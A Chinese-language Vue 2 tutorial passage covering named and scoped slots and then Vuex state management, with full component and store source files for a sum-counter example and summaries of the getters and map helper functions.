#### 2.22.2 具名插槽

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div  class="container">
    <Category title="美食">
      <img slot="center" src="https://s3.ax1x.com/2021/01/16/srJlq0.jpg" />
      <a slot="footer" href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">更多美食</a>
    </Category>

    <Category title="游戏">
      <ul slot="center">
        <li v-for="(g, index) in games" :key="index">{{ g }}</li>
      </ul>
      <div class="foot" slot="footer">
          <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">单机游戏</a>
          <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">网络游戏</a>
      </div>
    </Category>

    <Category title="电影">
      <video
        slot="center"
        controls
        src="https://vdept3.bdstatic.com/mda-rbahmp4f4z4sdxc8/cae_h264/1739278704766346239/mda-rbahmp4f4z4sdxc8.mp4?v_from_s=hkapp-haokan-nanjing&auth_key=1739291096-0-0-63c487c7778033283310fe6c25c0e288&bcevod_channel=searchbox_feed&pd=1&cr=0&cd=0&pt=3&logid=1496735763&vid=6626823136837992546&klogid=1496735763&abtest=132219_1"
      ></video>
    <template v-slot:footer>
        <div class="foot">
            <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">经典</a>
            <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">动作</a>
            <a href="https://s3.ax1x.com/2021/01/16/srJlq0.jpg">爱情</a>
        </div>
        <h4>欢迎前来观看</h4>
    </template>

    </Category>
  </div>
</template>

<script>
import axios from "axios";
import Category from "./components/Category";

export default {
  name: "App",
  components: { Category },
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: ["《变形金钢》", "《拆弹专家》", "《战狼》", "《哪吒》"],
    };
  },
};
</script>

<style scoped>
	.container,.foot {
		display: flex;
		justify-content: space-around;
	}
</style>
```

src\components\Category.vue

```vue
<template>
<div class="category">
  <h3>{{title}}</h3>
  <!-- 定义一个插槽，等着组件的使用进行填充 -->
  <slot name="center">插槽默认值,没有为插槽指定数据时，此将显示</slot>
  <slot name="footer">插槽默认值,没有为插槽指定数据时，此将显示</slot>
</div>
</template>

<script>
export default {
  name: "Category",
  props:["title"]
};
</script>

<style scoped>
	.category{
		background-color: skyblue;
		width: 200px;
		height: 300px;
	}
	h3{
		text-align: center;
		background-color: orange;
	}
	video{
		width: 100%;
	}
	img{
		width: 100%;
	}
</style>
```

启动服务

![image-20250211214409614](.\images\image-20250211214409614.png)



#### 2.22.3 作用域插槽

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div class="container">
    <Category title="游戏">
      <template scope="data">
        <ul>
          <li v-for="(g, index) in data.games" :key="index">{{ g }}</li>
        </ul>
        <h3>{{ data.msg }}</h3>
      </template>
    </Category>

    <Category title="游戏">
      <template scope="{games}">
        <ol>
          <li style="color: red" v-for="(g, index) in games" :key="index">{{ g }}</li>
        </ol>
      </template>
    </Category>

    <Category title="游戏">
      <template slot-scope="{ games }">
        <h4 v-for="(g, index) in games" :key="index">{{ g }}</h4>
      </template>
    </Category>
  </div>
</template>

<script>
import axios from "axios";
import Category from "./components/Category";

export default {
  name: "App",
  components: { Category },
};
</script>

<style scoped>
.container,
.foot {
  display: flex;
  justify-content: space-around;
}
</style>
```

src\components\Category.vue

```vue
<template>
  <div class="category">
    <h3>{{ title }}</h3>
    <!-- 通过子组件向父组件App传递内容 -->
    <slot :games="games" msg="hello22">插槽默认值,没有为插槽指定数据时，此将显示</slot>
  </div>
</template>

<script>
export default {
  name: "Category",
  props: ["title"],
  data() {
    return {
      games: ["和平精英", "穿越火线", "魔兽世界", "CS"],
    };
  },
};
</script>

<style scoped>
.category {
  background-color: skyblue;
  width: 200px;
  height: 300px;
}
h3 {
  text-align: center;
  background-color: orange;
}
video {
  width: 100%;
}
img {
  width: 100%;
}
</style>

```

启动服务

![image-20250211220020762](.\images\image-20250211220020762.png)

#### 总结

1. 作用：让父组件可以向子组件指定位置插入html结构，也是一种组件间通信的方式，适用于 <strong style="color:red">父组件 ===> 子组件</strong> 。

2. 分类：默认插槽、具名插槽、作用域插槽

3. 使用方式：

   1. 默认插槽：

      ```vue
      父组件中：
              <Category>
                 <div>html结构1</div>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot>插槽默认内容...</slot>
                  </div>
              </template>
      ```

   2. 具名插槽：

      ```vue
      父组件中：
              <Category>
                  <template slot="center">
                    <div>html结构1</div>
                  </template>
      
                  <template v-slot:footer>
                     <div>html结构2</div>
                  </template>
              </Category>
      子组件中：
              <template>
                  <div>
                     <!-- 定义插槽 -->
                     <slot name="center">插槽默认内容...</slot>
                     <slot name="footer">插槽默认内容...</slot>
                  </div>
              </template>
      ```

   3. 作用域插槽：

      1. 理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（games数据在Category组件中，但使用数据所遍历出来的结构由App组件决定）

      2. 具体编码：

         ```vue
         父组件中：
         		<Category>
         			<template scope="scopeData">
         				<!-- 生成的是ul列表 -->
         				<ul>
         					<li v-for="g in scopeData.games" :key="g">{{g}}</li>
         				</ul>
         			</template>
         		</Category>
         
         		<Category>
         			<template slot-scope="scopeData">
         				<!-- 生成的是h4标题 -->
         				<h4 v-for="g in scopeData.games" :key="g">{{g}}</h4>
         			</template>
         		</Category>
         子组件中：
                 <template>
                     <div>
                         <slot :games="games"></slot>
                     </div>
                 </template>
         		
                 <script>
                     export default {
                         name:'Category',
                         props:['title'],
                         //数据在子组件自身
                         data() {
                             return {
                                 games:['红色警戒','穿越火线','劲舞团','超级玛丽']
                             }
                         },
                     }
                 </script>
         ```

   

## 3 vuex



![vuex](.\images\vuex.png)

### 3.1 vue求和使用vue实现

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>{{ sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: 'Count',
  data() {
    return {
      //用户选择的数字
      n: 1,
      //求和
      sum: 0
    }
  },
  methods: {
    increment() {
      this.sum += this.n;
    },
    decrement() {
      this.sum -= this.n;
    },
    incrementOdd() {
      if (this.sum % 2 !== 0) {
        this.sum += this.n;
      }
    },
    incrementWait() {
      setTimeout(() => {
        this.sum += this.n;
      }, 500);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

启动服务

```sh
npm run serve
```

![image-20250212123924533](.\images\image-20250212123924533.png)

### 3.2 使用Vuex改写求和案例

```sh
# 安装vuex
npm i vuex@3
```

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>

```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    sum: 0
}

//创建并暴露store
export default new Vuex.Store({
    actions:actions,
    mutations:mutations,
    state
})

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>{{ $store.state.sum }}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: 'Count',
  data() {
    return {
      //用户选择的数字
      n: 1,
      //求和
      sum: 0
    }
  },
  methods: {
    increment() {
        this.$store.dispatch('increment',this.n);
    },
    decrement() {
      this.$store.commit('DECREMENT',this.n);
    },
    incrementOdd() {
      this.$store.dispatch('incrementOdd',this.n);
    },
    incrementWait() {
      this.$store.dispatch('incrementWait',this.n);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

运行服务

![image-20250212144008974](.\images\image-20250212144008974.png)



### 3.3 getters的使用

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    sum: 0
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state){
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions:actions,
    mutations:mutations,
    state,
    getters
})
```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ $store.state.sum }}</h1>
    <h1>当前求和放大10倍为:{{ $store.getters.bigSum}}</h1>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
export default {
  name: 'Count',
  data() {
    return {
      //用户选择的数字
      n: 1,
      //求和
      sum: 0
    }
  },
  methods: {
    increment() {
        this.$store.dispatch('increment',this.n);
    },
    decrement() {
      this.$store.commit('DECREMENT',this.n);
    },
    incrementOdd() {
      this.$store.dispatch('incrementOdd',this.n);
    },
    incrementWait() {
      this.$store.dispatch('incrementWait',this.n);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

启动服务检查

![image-20250212214435607](.\images\image-20250212214435607.png)

总结：getters的使用

1. 概念：当state中的数据需要经过加工后再使用时，可以使用getters加工。

2. 在```store.js```中追加```getters```配置

   ```js
   ......
   
   const getters = {
   	bigSum(state){
   		return state.sum * 10
   	}
   }
   
   //创建并暴露store
   export default new Vuex.Store({
   	......
   	getters
   })
   ```

3. 组件中读取数据：```$store.getters.bigSum```

### 3.4 mapState和mapGetters

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    //求和
    sum: 0,
    school: '交大',
    subject: '计算机'
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions: actions,
    mutations: mutations,
    state,
    getters
})
```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment">+</button>
    <button @click="decrement">-</button>
    <button @click="incrementOdd">当前求和为奇数再加</button>
    <button @click="incrementWait">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    /* sum() {
      return this.$store.state.sum;
    },
    school() {
      return this.$store.state.school;
    },
    subject() {
      return this.$store.state.subject;
    }, */

    //借助mapState生成计算属性，从state中读取数据（对象写法）
    // ...mapState({ sum: "sum", school: "school", subject: "subject" }),
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(['sum','school','subject']),

    /*  
     bigSum() {
      return this.$store.getters.bigSum;
    }, */
    //借助mapGetters生成计算属性,从getters中读取数据。（对象写法）
    // ...mapGetters({ bigSum: "bigSum" }),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters(['bigSum']),
  },
  methods: {
    increment() {
      this.$store.dispatch("increment", this.n);
    },
    decrement() {
      this.$store.commit("DECREMENT", this.n);
    },
    incrementOdd() {
      this.$store.dispatch("incrementOdd", this.n);
    },
    incrementWait() {
      this.$store.dispatch("incrementWait", this.n);
    },
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

![image-20250212223621948](.\images\image-20250212223621948.png)



### 3.5 mapActions和mapMutations

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
  </div>
</template>

<script>
import Count from "./components/Count";

export default {
  name: "App",
  components: { Count },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    }
}

//准备State--用于存储数据
const state = {
    //求和
    sum: 0,
    school: '交大',
    subject: '计算机'
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions: actions,
    mutations: mutations,
    state,
    getters
})
```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="INCREMENT(n)">+</button>
    <button @click="DECREMENT(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    /* sum() {
      return this.$store.state.sum;
    },
    school() {
      return this.$store.state.school;
    },
    subject() {
      return this.$store.state.subject;
    }, */

    //借助mapState生成计算属性，从state中读取数据（对象写法）
    // ...mapState({ sum: "sum", school: "school", subject: "subject" }),
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(["sum", "school", "subject"]),

    /*
     bigSum() {
      return this.$store.getters.bigSum;
    }, */
    //借助mapGetters生成计算属性,从getters中读取数据。（对象写法）
    // ...mapGetters({ bigSum: "bigSum" }),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters(["bigSum"]),
  },
  methods: {
    /* increment() {
      this.$store.commit("INCREMENT", this.n);
    },
    decrement() {
      this.$store.commit("DECREMENT", this.n);
     },
     */
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(对象写法),注意参数需要传递
    // ...mapMutations({ increment: "INCREMENT", decrement: "DECREMENT" }),
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(数组写法),此需要将调用方法改为INCREMENT和DECREMENT
    ...mapMutations(["INCREMENT", "DECREMENT"]),

    /* incrementOdd() {
      this.$store.dispatch("incrementOdd", this.n);
    },
    incrementWait() {
      this.$store.dispatch("incrementWait", this.n);
    }, */
    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
    // ...mapActions({incrementOdd:'incrementOdd',incrementWait:'incrementWait'}),
    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(数组写法)
    ...mapActions(["incrementOdd", "incrementWait"]),
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>

```

启动验证

![image-20250212223855201](.\images\image-20250212223855201.png)



总结：四个map方法的使用

1. <strong>mapState方法：</strong>用于帮助我们映射```state```中的数据为计算属性

   ```js
   computed: {
       //借助mapState生成计算属性：sum、school、subject（对象写法）
        ...mapState({sum:'sum',school:'school',subject:'subject'}),
            
       //借助mapState生成计算属性：sum、school、subject（数组写法）
       ...mapState(['sum','school','subject']),
   },
   ```

2. <strong>mapGetters方法：</strong>用于帮助我们映射```getters```中的数据为计算属性

   ```js
   computed: {
       //借助mapGetters生成计算属性：bigSum（对象写法）
       ...mapGetters({bigSum:'bigSum'}),
   
       //借助mapGetters生成计算属性：bigSum（数组写法）
       ...mapGetters(['bigSum'])
   },
   ```

3. <strong>mapActions方法：</strong>用于帮助我们生成与```actions```对话的方法，即：包含```$store.dispatch(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：incrementOdd、incrementWait（对象形式）
       ...mapActions({incrementOdd:'jiaOdd',incrementWait:'jiaWait'})
   
       //靠mapActions生成：incrementOdd、incrementWait（数组形式）
       ...mapActions(['jiaOdd','jiaWait'])
   }
   ```

4. <strong>mapMutations方法：</strong>用于帮助我们生成与```mutations```对话的方法，即：包含```$store.commit(xxx)```的函数

   ```js
   methods:{
       //靠mapActions生成：increment、decrement（对象形式）
       ...mapMutations({increment:'JIA',decrement:'JIAN'}),
       
       //靠mapMutations生成：JIA、JIAN（对象形式）
       ...mapMutations(['JIA','JIAN']),
   }
   ```

> 备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。

### 3.6  组件共享

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入store,src/store/index.js,默认文件是这个，名称相同时，便可不写
import store from './store'

//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	store:store,
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div>
    <Count />
    <hr/>
    <Person/>
  </div>
</template>

<script>
import Count from "./components/Count";
import Person from "./components/Person";

export default {
  name: "App",
  components: { Count,Person },
};
</script>
```

src\store\index.js

```js
//该文件创建Vuex中最核心的Store
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//应用Vuex插件
Vue.use(Vuex)

//准备actions-用于响应组件中的动作 
const actions = {
    increment(context, value) {
        console.log('actions中的increment被调用了')
        context.commit('INCREMENT', value);
    },
    incrementOdd(context, value) {
        if (context.state.sum % 2 !== 0) {
            context.commit('INCREMENT', value);
        }
    },
    incrementWait(context, value) {
        setTimeout(() => {
            context.commit('INCREMENT', value);
        }, 500);
    }
}

//准备mutations--用于操作数据 
const mutations = {
    INCREMENT(state, value) {
        console.log('mutations中的INCREMENT被调用了')
        state.sum += value;
    },
    DECREMENT(state, value) {
        state.sum -= value;
    },
    ADD_PERSON(state,value){
        state.personList.unshift(value);
    }
}

//准备State--用于存储数据
const state = {
    //求和
    sum: 0,
    school: '交大',
    subject: '计算机',
    personList:[
        {id:'001',name:'nullnull'}
    ]
}

//准备Getters-用于将state中的数据进行加工
const getters = {
    bigSum(state) {
        return state.sum * 10
    }
}

//创建并暴露store
export default new Vuex.Store({
    actions: actions,
    mutations: mutations,
    state,
    getters
})

```

src\components\Count.vue

```vue
<template>
  <div>
    <h1>当前的数据求和为：{{ sum }}</h1>
    <h1>当前求和放大10倍为:{{ bigSum }}</h1>
    <h3>我在{{ school }},学习{{ subject }}</h3>
    <h3 style="color: red">Person组件的总人数是:{{ personList.length }}</h3>
    <select v-model.number="n">
      <option value="1">1</option>
      <option value="2">2</option>
      <option value="3">3</option>
    </select>
    <button @click="increment(n)">+</button>
    <button @click="decrement(n)">-</button>
    <button @click="incrementOdd(n)">当前求和为奇数再加</button>
    <button @click="incrementWait(n)">等一等再加</button>
  </div>
</template>

<script>
import { mapState, mapGetters, mapMutations, mapActions } from "vuex";
export default {
  name: "Count",
  data() {
    return {
      //用户选择的数字
      n: 1,
    };
  },
  //使用计算属性来展示
  computed: {
    //借助mapState生成计算属性，从state中读取数据（数组写法）
    ...mapState(["sum", "school", "subject", "personList"]),
    //借助mapGetters生成计算属性,从getters中读取数据。（数组写法）
    ...mapGetters(["bigSum"]),
  },
  methods: {
    //借助mapMutaions生成对应的方法，方法中会调用commit去联系mutaions(对象写法),注意参数需要传递
    ...mapMutations({ increment: "INCREMENT", decrement: "DECREMENT" }),

    //借助mapActions生成对应的方法，方法中会调用dispatch去联系actions(对象写法)
    ...mapActions({ incrementOdd: "incrementOdd", incrementWait: "incrementWait" }),
  },
};
</script>

<style lang="css">
button {
  margin-left: 5px;
}
</style>
```

src\components\Person.vue

```vue
<template>
  <div>
        <h1>人员列表</h1>
        <h3 style="color:red">组件的求和为:{{sum}}</h3>
        <input type="text" placeholder="请输入名称" v-model="name" />
        <button @click="add">添加</button>
        <ul>
            <li v-for="p in personList" :key="p.id">{{p.name}}</li>
        </ul>
  </div>
</template>

<script>
import {nanoid} from 'nanoid'
export default {
    name: 'Person',
    data(){
        return {
            name:''
        }
    },
    computed:{
        personList(){
            return this.$store.state.personList;
        },
        sum(){
            return this.$store.state.sum;
        }
    },
    methods:{
        add(){
            const personObj = {id:nanoid(),name:this.name}
            console.log('user',personObj);
            this.$store.commit('ADD_PERSON',personObj);
            this.name = ''
        }
    }
}
</script>

<style>

</style>
```

效果

![image-20250212225848568](.\images\image-20250212225848568.png)



## 结束

